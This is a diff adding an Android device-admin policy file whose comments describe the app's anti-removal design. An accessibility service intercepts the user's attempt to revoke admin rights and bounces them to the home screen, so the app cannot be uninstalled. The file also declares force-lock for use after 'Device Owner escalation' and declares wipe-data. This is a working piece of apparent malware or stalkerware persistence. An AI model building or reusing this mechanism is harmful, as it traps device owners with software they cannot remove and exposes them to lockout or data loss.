@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Device Admin policy declaration for Max20DeviceAdminReceiver.
+
+  When the user grants Device Admin status, the Android OS blocks
+  uninstallation of this application until the admin is explicitly
+  deactivated. The AccessibilityService intercepts the deactivation
+  attempt and redirects HOME before the user can confirm it.
+
+  Declared policies:
+  - force-lock: used if Device Owner escalation is achieved (DPM lockdown)
+  - wipe-data: declared but never invoked — required for DO provisioning flows
+-->
+<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-policies>
+        <force-lock />
+        <wipe-data />
+    </uses-policies>
+</device-admin>
